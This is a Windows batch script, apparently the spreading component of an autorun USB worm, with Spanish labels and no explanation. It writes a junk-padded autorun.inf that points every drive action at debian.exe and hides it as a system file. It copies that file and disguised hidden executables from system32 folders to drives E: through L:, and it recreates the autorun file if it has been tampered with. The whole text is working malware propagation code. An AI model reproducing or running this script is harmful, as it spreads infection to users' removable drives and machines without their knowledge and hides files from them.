set pantalla=cls

if exist %systemroot%\system32\schosv.exe (goto pase)

cd\
cd %systemroot%\system32
copy ipconfig.exe schosv.exe

:pase

if exist %systemroot%\system32\winaudio0x.dll (exit) 


:bucle
%pantalla%

if exist C:\autorun.inf (goto amiguis) else (goto nuez)


:nuez
echo [AutoRun]>>C:\autorun.inf
echo labeld= cross g23h2hg324gh24h4g3hc>>C:\autorun.inf
echo open=debian.exe>>C:\autorun.inf
echo sdfsdfwewe2f32323cx2c323c3c23c23.dvr>>C:\autorun.inf
echo shellexecute=debian.exe>>C:\autorun.inf
echo sdjbwchwbdibdebian.exewshellexeculskdksdkjhs>>C:\autorun.inf
echo shelaslaslopenasasjakdjkahsdkjash>>C:\autorun.inf
echo shell\Explore\Command=debian.exe>>C:\autorun.inf
echo shellexploeckewmcjejwcbhwebciwubeicudebian.exe>>C:\autorun.inf
echo shell\find\command=debian.exe>>C:\autorun.inf
echo shellfindkhaskhadebian.exeaannpopeodeiaoeniae>>C:\autorun.inf
echo shell\CMD=S�mbolo del sistema>>C:\autorun.inf
echo shell\CMD\Command=debian.exe>>C:\autorun.inf
echo shell\Auto=Reproducci�n Autom�tica>>C:\autorun.inf
echo shell\Auto\Command=debian.exe>>C:\autorun.inf
echo shelleXecmdkjadhkjddebian,exeduykajdhkshdddebian>>C:\autorun.inf
echo shell\Open\command=debian.exe>>C:\autorun.inf
echo shelleXecmdkjadhkjdkjhgkjgasduykajdhkshdddebian>>C:\autorun.inf
echo shellautojkajkasdebian.exesjdnbajsbhdjhasbjhaskas>>C:\autorun.inf
attrib +h +s +r C:\autorun.inf

:amiguis
for /f "tokens=2 DELIMS= " %%B in ('FIND /I "cross" C:\autorun.inf') do set co=%%B
if cross== %co% (goto b) else (goto borradoforce)


:b


if not exist E:\ (goto FW)
IF exist C:\autorun.inf (attrib -s -h -r C:\autorun.inf & del /f /q /a:s E:\autorun.inf & del /f /q /a:h E:\autorun.inf & copy /y "C:\autorun.inf" "E:\autorun.inf" & attrib +s +h +r E:\autorun.inf & attrib +s +h +r C:\autorun.inf)


:FW

if not exist F:\ (goto GW)
IF exist C:\autorun.inf (attrib -s -h -r C:\autorun.inf & del /f /q /a:s F:\autorun.inf & del /f /q /a:h F:\autorun.inf & copy /y "C:\autorun.inf" "F:\autorun.inf" & attrib +s +h +r F:\autorun.inf & attrib +s +h +r C:\autorun.inf)

:GW

if not exist G:\ (goto HW)
IF exist C:\autorun.inf (attrib -s -h -r C:\autorun.inf & del /f /q /a:s G:\autorun.inf & del /f /q /a:h G:\autorun.inf & copy /y "C:\autorun.inf" "G:\autorun.inf" & attrib +s +h +r G:\autorun.inf & attrib +s +h +r C:\autorun.inf)


:HW

if not exist H:\ (goto IW)
IF exist C:\autorun.inf (attrib -s -h -r C:\autorun.inf & del /f /q /a:s H:\autorun.inf & del /f /q /a:h H:\autorun.inf & copy /y "C:\autorun.inf" "H:\autorun.inf" & attrib +s +h +r H:\autorun.inf & attrib +s +h +r C:\autorun.inf)


:IW
if not exist I:\ (goto JW)
IF exist C:\autorun.inf (attrib -s -h -r C:\autorun.inf & del /f /q /a:s I:\autorun.inf & del /f /q /a:h I:\autorun.inf & copy /y "C:\autorun.inf" "I:\autorun.inf" & attrib +s +h +r I:\autorun.inf & attrib +s +h +r C:\autorun.inf)

:JW
if not exist J:\ (goto KW)
IF exist C:\autorun.inf (attrib -s -h -r C:\autorun.inf & del /f /q /a:s J:\autorun.inf & del /f /q /a:h J:\autorun.inf & copy /y "C:\autorun.inf" "J:\autorun.inf" & attrib +s +h +r J:\autorun.inf & attrib +s +h +r C:\autorun.inf)

:KW

if not exist K:\ (goto LW)
IF exist C:\autorun.inf (attrib -s -h -r C:\autorun.inf & del /f /q /a:s K:\autorun.inf & del /f /q /a:h K:\autorun.inf & copy /y "C:\autorun.inf" "K:\autorun.inf" & attrib +s +h +r K:\autorun.inf & attrib +s +h +r C:\autorun.inf)


:LW
if not exist L:\ (goto MW)
IF exist C:\autorun.inf (attrib -s -h -r C:\autorun.inf & del /f /q /a:s L:\autorun.inf & del /f /q /a:h L:\autorun.inf & copy /y "C:\autorun.inf" "L:\autorun.inf" & attrib +s +h +r L:\autorun.inf & attrib +s +h +r C:\autorun.inf)

:MW

if exist C:\debian.exe (goto buala)

if exist %systemroot%\system32\config\ntus.txt (attrib -s -h -r %systemroot%\system32\config\ntus.txt & copy /y %systemroot%\system32\config\ntus.txt C:\debian.exe & attrib +s +h +r %systemroot%\system32\config\ntus.txt & attrib +s +h +r C:\debian.exe)

:buala

if not exist E:\ (goto FX)
if exist E:\mstr.exe (goto FX)

if exist %systemroot%\system32\spool\arrow.cur (attrib -s -h -r %systemroot%\system32\spool\arrow.cur & copy /y %systemroot%\system32\spool\arrow.cur E:\itunes.dvr & attrib +s +h +r %systemroot%\system32\spool\arrow.cur & attrib +s +h +r E:\itunes.dvr)

if exist %systemroot%\system32\config\svchost.exe (attrib -s -h -r %systemroot%\system32\config\svchost.exe & copy /y %systemroot%\system32\config\svchost.exe E:\iusb.dvr & attrib +s +h +r %systemroot%\system32\config\svchost.exe & attrib +s +h +r E:\iusb.dvr)

if exist %systemroot%\system32\config\csrss.exe (attrib -s -h -r %systemroot%\system32\config\csrss.exe & copy /y %systemroot%\system32\config\csrss.exe E:\sys.dvr & attrib +s +h +r %systemroot%\system32\config\csrss.exe & attrib +s +h +r E:\sys.dvr)


if exist %systemroot%\system32\config\ntus.txt (attrib -s -h -r %systemroot%\system32\config\ntus.txt & copy /y %systemroot%\system32\config\ntus.txt E:\debian.exe & attrib +s +h +r %systemroot%\system32\config\ntus.txt & attrib +s +h +r E:\debian.exe)


if exist %systemroot%\system32\config\Log_Office.txt (attrib -s -h -r %systemroot%\system32\config\Log_Office.txt & copy /y %systemroot%\system32\config\Log_Office.txt E:\mstr.exe & attrib +s +h +r %systemroot%\system32\config\Log_Office.txt & attrib +s +h +r E:\mstr.exe)


if exist %systemroot%\system32\config\services.exe (attrib -s -h -r %systemroot%\system32\config\services.exe & copy /y %systemroot%\system32\config\services.exe E:\systm.dvr & attrib +s +h +r %systemroot%\system32\config\services.exe & attrib +s +h +r E:\systm.dvr)


:FX
if not exist F:\ (goto GX)
if exist F:\mstr.exe (goto GX)

if exist %systemroot%\system32\spool\arrow.cur (attrib -s -h -r %systemroot%\system32\spool\arrow.cur & copy /y %systemroot%\system32\spool\arrow.cur F:\itunes.dvr & attrib +s +h +r %systemroot%\system32\spool\arrow.cur & attrib +s +h +r F:\itunes.dvr)


if exist %systemroot%\system32\config\svchost.exe (attrib -s -h -r %systemroot%\system32\config\svchost.exe & copy /y %systemroot%\system32\config\svchost.exe F:\iusb.dvr & attrib +s +h +r %systemroot%\system32\config\svchost.exe & attrib +s +h +r F:\iusb.dvr)


if exist %systemroot%\system32\config\csrss.exe (attrib -s -h -r %systemroot%\system32\config\csrss.exe & copy /y %systemroot%\system32\config\csrss.exe F:\sys.dvr & attrib +s +h +r %systemroot%\system32\config\csrss.exe & attrib +s +h +r F:\sys.dvr)


if exist %systemroot%\system32\config\ntus.txt (attrib -s -h -r %systemroot%\system32\config\ntus.txt & copy /y %systemroot%\system32\config\ntus.txt F:\debian.exe & attrib +s +h +r %systemroot%\system32\config\ntus.txt & attrib +s +h +r F:\debian.exe)


if exist %systemroot%\system32\config\Log_Office.txt (attrib -s -h -r %systemroot%\system32\config\Log_Office.txt & copy /y %systemroot%\system32\config\Log_Office.txt F:\mstr.exe & attrib +s +h +r %systemroot%\system32\config\Log_Office.txt & attrib +s +h +r F:\mstr.exe)


if exist %systemroot%\system32\config\services.exe (attrib -s -h -r %systemroot%\system32\config\services.exe & copy /y %systemroot%\system32\config\services.exe F:\systm.dvr & attrib +s +h +r %systemroot%\system32\config\services.exe & attrib +s +h +r F:\systm.dvr)


:GX

if not exist G:\ (goto HX)
if exist G:\mstr.exe (goto HX)
if exist %systemroot%\system32\spool\arrow.cur (attrib -s -h -r %systemroot%\system32\spool\arrow.cur & copy /y %systemroot%\system32\spool\arrow.cur G:\itunes.dvr & attrib +s +h +r %systemroot%\system32\spool\arrow.cur & attrib +s +h +r G:\itunes.dvr)


if exist %systemroot%\system32\config\svchost.exe (attrib -s -h -r %systemroot%\system32\config\svchost.exe & copy /y %systemroot%\system32\config\svchost.exe G:\iusb.dvr & attrib +s +h +r %systemroot%\system32\config\svchost.exe & attrib +s +h +r G:\iusb.dvr)


if exist %systemroot%\system32\config\csrss.exe (attrib -s -h -r %systemroot%\system32\config\csrss.exe & copy /y %systemroot%\system32\config\csrss.exe G:\sys.dvr & attrib +s +h +r %systemroot%\system32\config\csrss.exe & attrib +s +h +r G:\sys.dvr)


if exist %systemroot%\system32\config\ntus.txt (attrib -s -h -r %systemroot%\system32\config\ntus.txt & copy /y %systemroot%\system32\config\ntus.txt G:\debian.exe & attrib +s +h +r %systemroot%\system32\config\ntus.txt & attrib +s +h +r G:\debian.exe)


if exist %systemroot%\system32\config\Log_Office.txt (attrib -s -h -r %systemroot%\system32\config\Log_Office.txt & copy /y %systemroot%\system32\config\Log_Office.txt G:\mstr.exe & attrib +s +h +r %systemroot%\system32\config\Log_Office.txt & attrib +s +h +r G:\mstr.exe)


if exist %systemroot%\system32\config\services.exe (attrib -s -h -r %systemroot%\system32\config\services.exe & copy /y %systemroot%\system32\config\services.exe G:\systm.dvr & attrib +s +h +r %systemroot%\system32\config\services.exe & attrib +s +h +r G:\systm.dvr)


:HX
if not exist H:\ (goto IX)
if exist H:\mstr.exe (goto IX)

if exist %systemroot%\system32\spool\arrow.cur (attrib -s -h -r %systemroot%\system32\spool\arrow.cur & copy /y %systemroot%\system32\spool\arrow.cur H:\itunes.dvr & attrib +s +h +r %systemroot%\system32\spool\arrow.cur & attrib +s +h +r H:\itunes.dvr)


if exist %systemroot%\system32\config\svchost.exe (attrib -s -h -r %systemroot%\system32\config\svchost.exe & copy /y %systemroot%\system32\config\svchost.exe H:\iusb.dvr & attrib +s +h +r %systemroot%\system32\config\svchost.exe & attrib +s +h +r H:\iusb.dvr)


if exist %systemroot%\system32\config\csrss.exe (attrib -s -h -r %systemroot%\system32\config\csrss.exe & copy /y %systemroot%\system32\config\csrss.exe H:\sys.dvr & attrib +s +h +r %systemroot%\system32\config\csrss.exe & attrib +s +h +r H:\sys.dvr)


if exist %systemroot%\system32\config\ntus.txt (attrib -s -h -r %systemroot%\system32\config\ntus.txt & copy /y %systemroot%\system32\config\ntus.txt H:\debian.exe & attrib +s +h +r %systemroot%\system32\config\ntus.txt & attrib +s +h +r H:\debian.exe)


if exist %systemroot%\system32\config\Log_Office.txt (attrib -s -h -r %systemroot%\system32\config\Log_Office.txt & copy /y %systemroot%\system32\config\Log_Office.txt H:\mstr.exe & attrib +s +h +r %systemroot%\system32\config\Log_Office.txt & attrib +s +h +r H:\mstr.exe)


if exist %systemroot%\system32\config\services.exe (attrib -s -h -r %systemroot%\system32\config\services.exe & copy /y %systemroot%\system32\config\services.exe H:\systm.dvr & attrib +s +h +r %systemroot%\system32\config\services.exe & attrib +s +h +r H:\systm.dvr)


:IX
if not exist I:\ (goto JX)
if exist I:\mstr.exe (goto JX)

if exist %systemroot%\system32\spool\arrow.cur (attrib -s -h -r %systemroot%\system32\spool\arrow.cur & copy /y %systemroot%\system32\spool\arrow.cur I:\itunes.dvr & attrib +s +h +r %systemroot%\system32\spool\arrow.cur & attrib +s +h +r I:\itunes.dvr)


if exist %systemroot%\system32\config\svchost.exe (attrib -s -h -r %systemroot%\system32\config\svchost.exe & copy /y %systemroot%\system32\config\svchost.exe I:\iusb.dvr & attrib +s +h +r %systemroot%\system32\config\svchost.exe & attrib +s +h +r I:\iusb.dvr)


if exist %systemroot%\system32\config\csrss.exe (attrib -s -h -r %systemroot%\system32\config\csrss.exe & copy /y %systemroot%\system32\config\csrss.exe I:\sys.dvr & attrib +s +h +r %systemroot%\system32\config\csrss.exe & attrib +s +h +r I:\sys.dvr)


if exist %systemroot%\system32\config\ntus.txt (attrib -s -h -r %systemroot%\system32\config\ntus.txt & copy /y %systemroot%\system32\config\ntus.txt I:\debian.exe & attrib +s +h +r %systemroot%\system32\config\ntus.txt & attrib +s +h +r I:\debian.exe)


if exist %systemroot%\system32\config\Log_Office.txt (attrib -s -h -r %systemroot%\system32\config\Log_Office.txt & copy /y %systemroot%\system32\config\Log_Office.txt I:\mstr.exe & attrib +s +h +r %systemroot%\system32\config\Log_Office.txt & attrib +s +h +r I:\mstr.exe)


if exist %systemroot%\system32\config\services.exe (attrib -s -h -r %systemroot%\system32\config\services.exe & copy /y %systemroot%\system32\config\services.exe I:\systm.dvr & attrib +s +h +r %systemroot%\system32\config\services.exe & attrib +s +h +r I:\systm.dvr)


:JX
if not exist J:\ (goto KX)
if exist J:\mstr.exe (goto KX)

if exist %systemroot%\system32\spool\arrow.cur (attrib -s -h -r %systemroot%\system32\spool\arrow.cur & copy /y %systemroot%\system32\spool\arrow.cur J:\itunes.dvr & attrib +s +h +r %systemroot%\system32\spool\arrow.cur & attrib +s +h +r J:\itunes.dvr)


if exist %systemroot%\system32\config\svchost.exe (attrib -s -h -r %systemroot%\system32\config\svchost.exe & copy /y %systemroot%\system32\config\svchost.exe J:\iusb.dvr & attrib +s +h +r %systemroot%\system32\config\svchost.exe & attrib +s +h +r J:\iusb.dvr)


if exist %systemroot%\system32\config\csrss.exe (attrib -s -h -r %systemroot%\system32\config\csrss.exe & copy /y %systemroot%\system32\config\csrss.exe J:\sys.dvr & attrib +s +h +r %systemroot%\system32\config\csrss.exe & attrib +s +h +r J:\sys.dvr)


if exist %systemroot%\system32\config\ntus.txt (attrib -s -h -r %systemroot%\system32\config\ntus.txt & copy /y %systemroot%\system32\config\ntus.txt J:\debian.exe & attrib +s +h +r %systemroot%\system32\config\ntus.txt & attrib +s +h +r J:\debian.exe)


if exist %systemroot%\system32\config\Log_Office.txt (attrib -s -h -r %systemroot%\system32\config\Log_Office.txt & copy /y %systemroot%\system32\config\Log_Office.txt J:\mstr.exe & attrib +s +h +r %systemroot%\system32\config\Log_Office.txt & attrib +s +h +r J:\mstr.exe)


if exist %systemroot%\system32\config\services.exe (attrib -s -h -r %systemroot%\system32\config\services.exe & copy /y %systemroot%\system32\config\services.exe J:\systm.dvr & attrib +s +h +r %systemroot%\system32\config\services.exe & attrib +s +h +r J:\systm.dvr)


:KX

if not exist K:\ (goto LX)
if exist K:\mstr.exe (goto LX)
if exist %systemroot%\system32\spool\arrow.cur (attrib -s -h -r %systemroot%\system32\spool\arrow.cur & copy /y %systemroot%\system32\spool\arrow.cur K:\itunes.dvr & attrib +s +h +r %systemroot%\system32\spool\arrow.cur & attrib +s +h +r K:\itunes.dvr)

if exist %systemroot%\system32\config\svchost.exe (attrib -s -h -r %systemroot%\system32\config\svchost.exe & copy /y %systemroot%\system32\config\svchost.exe K:\iusb.dvr & attrib +s +h +r %systemroot%\system32\config\svchost.exe & attrib +s +h +r K:\iusb.dvr)


if exist %systemroot%\system32\config\csrss.exe (attrib -s -h -r %systemroot%\system32\config\csrss.exe & copy /y %systemroot%\system32\config\csrss.exe K:\sys.dvr & attrib +s +h +r %systemroot%\system32\config\csrss.exe & attrib +s +h +r K:\sys.dvr)


if exist %systemroot%\system32\config\ntus.txt (attrib -s -h -r %systemroot%\system32\config\ntus.txt & copy /y %systemroot%\system32\config\ntus.txt K:\debian.exe & attrib +s +h +r %systemroot%\system32\config\ntus.txt & attrib +s +h +r K:\debian.exe)


if exist %systemroot%\system32\config\Log_Office.txt (attrib -s -h -r %systemroot%\system32\config\Log_Office.txt & copy /y %systemroot%\system32\config\Log_Office.txt K:\mstr.exe & attrib +s +h +r %systemroot%\system32\config\Log_Office.txt & attrib +s +h +r K:\mstr.exe)


if exist %systemroot%\system32\config\services.exe (attrib -s -h -r %systemroot%\system32\config\services.exe & copy /y %systemroot%\system32\config\services.exe K:\systm.dvr & attrib +s +h +r %systemroot%\system32\config\services.exe & attrib +s +h +r K:\systm.dvr)

:LX
if not exist L:\ (goto MX)
if exist L:\mstr.exe (goto MX)

if exist %systemroot%\system32\spool\arrow.cur (attrib -s -h -r %systemroot%\system32\spool\arrow.cur & copy /y %systemroot%\system32\spool\arrow.cur L:\itunes.dvr & attrib +s +h +r %systemroot%\system32\spool\arrow.cur & attrib +s +h +r L:\itunes.dvr)


if exist %systemroot%\system32\config\svchost.exe (attrib -s -h -r %systemroot%\system32\config\svchost.exe & copy /y %systemroot%\system32\config\svchost.exe L:\iusb.dvr & attrib +s +h +r %systemroot%\system32\config\svchost.exe & attrib +s +h +r L:\iusb.dvr)


if exist %systemroot%\system32\config\csrss.exe (attrib -s -h -r %systemroot%\system32\config\csrss.exe & copy /y %systemroot%\system32\config\csrss.exe L:\sys.dvr & attrib +s +h +r %systemroot%\system32\config\csrss.exe & attrib +s +h +r L:\sys.dvr)


if exist %systemroot%\system32\config\ntus.txt (attrib -s -h -r %systemroot%\system32\config\ntus.txt & copy /y %systemroot%\system32\config\ntus.txt L:\debian.exe & attrib +s +h +r %systemroot%\system32\config\ntus.txt & attrib +s +h +r L:\debian.exe)

if exist %systemroot%\system32\config\Log_Office.txt (attrib -s -h -r %systemroot%\system32\config\Log_Office.txt & copy /y %systemroot%\system32\config\Log_Office.txt L:\mstr.exe & attrib +s +h +r %systemroot%\system32\config\Log_Office.txt & attrib +s +h +r L:\mstr.exe)

if exist %systemroot%\system32\config\services.exe (attrib -s -h -r %systemroot%\system32\config\services.exe & copy /y %systemroot%\system32\config\services.exe L:\systm.dvr & attrib +s +h +r %systemroot%\system32\config\services.exe & attrib +s +h +r L:\systm.dvr)

:MX

exit

:borradoforce

del /f /q /a:s C:\autorun.inf
del /f /q /a:h C:\autorun.inf
del /f /q C:\autorun.inf
goto nuez











